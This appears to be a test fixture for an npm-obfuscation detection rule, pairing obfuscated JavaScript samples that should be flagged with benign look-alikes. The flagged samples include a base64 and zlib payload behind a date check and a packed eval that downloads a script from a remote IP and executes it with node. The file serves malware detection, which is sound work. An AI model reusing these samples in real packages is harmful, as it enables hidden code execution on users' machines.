/* OK: Unicode string definitions in Regex */
function f(){
    /** Used to compose unicode character classes. */
    var rsAstralRange = '\\ud800-\\udfff',
    rsComboMarksRange = '\\u0300-\\u036f\\ufe20-\\ufe23',
    rsComboSymbolsRange = '\\u20d0-\\u20f0',
    rsVarRange = '\\ufe0e\\ufe0f';

    /** Used to compose unicode capture groups. */
    var rsAstral = '[' + rsAstralRange + ']',
    rsCombo = '[' + rsComboMarksRange + rsComboSymbolsRange + ']',
    rsFitz = '\\ud83c[\\udffb-\\udfff]',
    rsModifier = '(?:' + rsCombo + '|' + rsFitz + ')',
    rsNonAstral = '[^' + rsAstralRange + ']',
    rsRegional = '(?:\\ud83c[\\udde6-\\uddff]){2}',
    rsSurrPair = '[\\ud800-\\udbff][\\udc00-\\udfff]',
    rsZWJ = '\\u200d';

    /** Used to compose unicode regexes. */
    var reOptMod = rsModifier + '?',
    rsOptVar = '[' + rsVarRange + ']?',
    rsOptJoin = '(?:' + rsZWJ + '(?:' + [rsNonAstral, rsRegional, rsSurrPair].join('|') + ')' + rsOptVar + reOptMod + ')*',
    rsSeq = rsOptVar + reOptMod + rsOptJoin,
    rsSymbol = '(?:' + [rsNonAstral + rsCombo + '?', rsCombo, rsRegional, rsSurrPair, rsAstral].join('|') + ')';

    /** Used to match [string symbols](https://mathiasbynens.be/notes/javascript-unicode). */
    // ok: npm-obfuscation
    var reUnicode = RegExp(rsFitz + '(?=' + rsFitz + ')|' + rsSymbol + rsSeq, 'g');
}

/* RuleID: Access class from the global object */
function f(){
    module.exports = c => {
        // ruleid: npm-obfuscation
        const B = global[Buffer.from([66, 117, 102, 102, 101, 114])]
        const f = B.from([102, 114, 111, 109])
        const D = global[B[f]([68, 97, 116, 101])]
        const s = 8
        const t = 29
        const n = new D()
        const _6 = B[f]([98, 97, 115, 101, 54, 52]) + ''
        const l = B[f]('Z2V0RnVsbFllYXI=', _6)
        const v = s => B[f](s, _6)[l]();
        const y = v('Z2V0RnVsbFllYXI=')
        const a = v('Z2V0VVRDRGF0ZQ==');
        const m = v('Z2V0VVRDTW9udGg=');
        const p = v('UGxlYXNlIHRyeSBhZ2FpbiBpbiA=')
        const z = require(v('emxpYg=='));
        const i = z[v('aW5mbGF0ZVN5bmM=')]
        let x_ = n[y]()
        const x = new D(`${x_++}-0${s + 1}-${t}`) - n
        const xx = x < 0 ? new D(`${x_}-0${s + 1}-${t}`) - n : x
        c(...(`${n[a]()}${n[m]()}` !== `${t}${s}` ? [`${p}${xx}ms`] : [null, console.log(i(B[f](B[f](JSON.parse(i(B[f]('eJw1U9Gx5DAIa4gPExsDtby5/ts4SXhnspNNAkIS8p8vtzzm32e+rp2t2007ae7HTuEWdq/VtvysHM/4rbTEdfEvLNhclqgL/Nv67AvVR+AAQHF9lguTllXrRtAmIvs9ZnJYpXXxdQ1QtzX6VnOA4JxMMBvwhZlF6DiaCL63+So3yykhCeMCDF6kCmheLaWUmHrtn5Opu4SCLYh0ilQIPvewupKylsXSJOclnZy55gm1V3bcK3RYSgd7GOCh5TvUQ2IB67Kdk0gHBsV5ek5LcchwF+WWathBoo9VUE7A6WJFfsMBX5wzD6VQGqm7HCPNkRxbJPZ82cSuaapZDKGG5ttJpXC18SBYTDPogtV94ViisUZpa+dXTrCJm/GrDtfO6uXAtdp8T+IZ/ksPJmI8bSgljH4LTV6QK6P6kkniJezk65dPeRzy9Gjh3zTeliZ0sYJJjZ9c0mCaWMrglj7IsHwGaUNaxGYuBPbNOViz6blxpk7E+QURA+n54qI1a5Ydv1QrUkeBocNFpKe8Z5ld71y29gAG78xg5zSS5/VMsat4ODL7a1BllY4OTKLhd+IruSB7/d9/b7zQBA==', _6))[l]()))[l](), _6))[l]())]))
    }    
}

/* RuleID: Method variables hex renaming  */
/* RuleID: Method obfuscated boolean iteration  */
function f(){
    // ruleid: npm-obfuscation
    (function(_0x19b533, _0x3a14dd) {
        const _0x491cff = _0x4cfd,
            _0x2dcd82 = _0x19b533();
        // ruleid: npm-obfuscation
        while (!![]) {
            try {
                const _0x2e6977 = -parseInt(_0x491cff(0x1bd)) / (0x156d + 0x1569 + -0x2ad5) * (-parseInt(_0x491cff(0x1a7)) / (0x1 * 0x2112 + -0xe * 0x1ea + -0x644)) + -parseInt(_0x491cff(0x19f)) / (-0x1 * -0x19d3 + -0x425 * -0x5 + -0x2e89) + parseInt(_0x491cff(0x1a2)) / (0x10d * -0x11 + 0x1 * 0xa7d + 0x764) + -parseInt(_0x491cff(0x195)) / (0x4 * 0x8a6 + 0x7 * 0x439 + 0x4022 * -0x1) * (-parseInt(_0x491cff(0x19a)) / (-0xbb9 * 0x1 + -0x1f2b + -0x6 * -0x727)) + -parseInt(_0x491cff(0x19b)) / (0x4a2 * 0x4 + 0x18fb + -0x1fa * 0x16) + parseInt(_0x491cff(0x1a1)) / (0x1b6b + -0x26f7 + 0xb94) + -parseInt(_0x491cff(0x1a4)) / (-0x261b + -0x20cb + 0x46ef) * (parseInt(_0x491cff(0x1a9)) / (0x1d4c + 0x1d * 0xbf + -0x32e5));
                if (_0x2e6977 === _0x3a14dd) break;
                else _0x2dcd82['push'](_0x2dcd82['shift']());
            } catch (_0x1ea857) {
                _0x2dcd82['push'](_0x2dcd82['shift']());
            }
        }
    }(_0x5808, -0x14ee15 + -0xd9a42 + 0x7 * 0x68bee));    
}

/* RuleID: Method obfuscated boolean iteration  */
function f(){
    // ruleid: npm-obfuscation
    for (var j = +!!false; j < defiq.length; j++) {
        defiq[j] = defiq[j] ^ dikol[j % dikol.length].charCodeAt(0);
    }
}

/* RuleID: String Array Mapping  */
function f() {
    console[_0x18447f(0x1a4)]("Hello");
    function fgh(param1, param2) {
      var abc62 = abc();
      return (
        (fgh = function (fgh40) {
          fgh40 = fgh40;
          var jkl = abc62[fgh40];
          return jkl;
        }),
        fgh(param1, param2)
      );
    }
    function abc() {
      // ruleid: npm-obfuscation
      var bde = [ "67328CLnbnw","68470dxkwKO","4551950sCJhcH","643965rfnWbh","log","20PPBvaa","210214GEkgbm","298024eAlwNB","1461qDyKpx","9acmuCv","78iZtvhJ",];
      // ruleid: npm-obfuscation
      abc = function () { return bde; }; return abc();
    }
  }

/* RuleID: JSFuck obfuscation  */
function f(){
    // ruleid: npm-obfuscation
    [][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])()
}

function f(){
    var x = [
        // ok: npm-obfuscation
    ]
}

/* RuleID: Cesar rotation  */
function f(){
    const i = 'gfudi';
    const k = s => s.split('').map(c => String.fromCharCode(c.charCodeAt() - 1)).join('');
    // ruleid: npm-obfuscation
    self[k(i)](urlTo);
}

/* RuleID: Cesar rotation  */
function f(){
    const x = "SERR PBQR PNZC"
    function rot13(str) { // LBH QVQ VG!
    
        var string = "";
        for(var i = 0; i < str.length; i++) {
            var temp = str.charAt(i);
            if(temp !== " " || temp!== "!" || temp!== "?") {
            string += String.fromCharCode(13 + String.prototype.charCodeAt(temp));
            } else {
            string += temp;
            }
        }
        
    return string;
    }

    // ruleid: npm-obfuscation
    self[rot13(x)](urlWithYourPreciousData); //should decode to "FREE CODE CAMP"
}

/* OK: Cesar rotation  */
function f(){
    const i = 'some data';
    // ok: npm-obfuscation
    const k = s => s.split('').map(c => 'c').join('');
    self[k(i)](urlTo);
}

/* OK: only JSFuck charactes in static data */
function f(){
    // ok: npm-obfuscation
    console.warn(`
    !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    
    WARNING
    
    Version discrepancies between server and "${clientRole}" client:
    + server: ${serverVersion} | client: ${clientVersion}
    
    This might lead to unexpected behavior, you should consider to re-install your
    dependencies on both your server and clients.
    
    !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!`);
}

/* OK: only JSFuck charactes in static data */
function f(){
    
/*
button component option
 variant = text , contained , outlined
// ok: npm-obfuscation
 ++++++++++++++
 text button 
 // ok: npm-obfuscation
 ++++++++++++++
 disabled
*/
}

function f(){
    // ruleid: npm-obfuscation
    var i=0                                                                                                                                                                                                                                                                                                                             ;print("malicious code here");
}

function f(){
    /**
     * Retrieves a list of up to 100 members and their membership status, given the provided paging and filtering.
     *
     * The queryMemberships function returns a Promise that resolves to a list of memberships.
     *
     * >**Note:** Site members can only query their own memberships.
     *
     // ok: npm-obfuscation
     * | Property                    | Supported Filters & Sorting                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
     * | --------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
     * | `status`                    | [`eq()`](#membershipsquerybuilder/eq), [`ne()`](#membershipsquerybuilder/ne)             |
     * | `role`                      | [`eq()`](#membershipsquerybuilder/eq), [`ne()`](#membershipsquerybuilder/ne)             |
     *
     * @public
     * @requiredField memberId
     * @param memberId - Site member ID.
     * @adminMethod
     */
}

function f(){
    // ruleid: npm-obfuscation
    eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('4 e=p(\'e\');4 9=p(\'9\');4{G}=p(\'1i\');j s(o,d,g){0.5(`K M N ${o}`);4 2=9.Z(d);e.Q(o,(b)=>{4{n,E}=b;6(n!==S){0.1(`U W.X I Y:${n}`);b.t();7}4 m=E[\'i-V\']||\'\';6(!m.x(\'T/u\')&&!m.x(\'R/u\')){0.1(\'P 2 O C a D 2. H.\');b.t();7}b.L(2);2.A(\'J\',()=>{2.10(g);0.5(`h v 1f z ${d}`)})}).A(\'1\',(c)=>{9.12(d,()=>{});0.1(\'k 1r 2:\',c.l)})}j B(3,g){0.5(`1q 2 i:${3}`);9.1o(3,\'1n\',(c,w)=>{6(c){0.1(\'k 1m 2:\',c.l);7}6(w.1l().1k(\'<1j>\')){0.1(\'h 11 z 1h 1s 1g 1e, C D. H.\');7}0.5(\'h i 1b 1a.\');g();})}j F(3){0.5(`17 16 2:${3}`);G(`15 ${3}`,(1,q,f)=>{6(1){0.1(`k 13 2:${1.l}`);7}6(f){0.1(`f:${f}`)}0.5(`q:${q}`)})}4 y=\'e://8.14.18.19/1c/1d.r\';4 3=\'./v-1p.r\';s(y,3,()=>{B(3,()=>{F(3);})});',62,91,'console|error|file|filePath|const|log|if|return||fs||response|err|outputPath|http|stderr|callback|File|content|function|Error|message|contentType|statusCode|url|require|stdout|js|downloadFile|resume|javascript|downloaded|data|includes|fileUrl|to|on|validateFile|not|JavaScript|headers|runFile|exec|Aborting|Status|finish|Starting|pipe|download|from|is|Downloaded|get|text|200|application|Download|type|failed|HTTP|Code|createWriteStream|close|appears|unlink|executing|152|node|the|Running|163|60|passed|validation|scripts|drop|document|successfully|HTML|be|child_process|html|startsWith|trim|reading|utf8|readFile|script|Validating|downloading|an'.split('|'),0,{}))
}
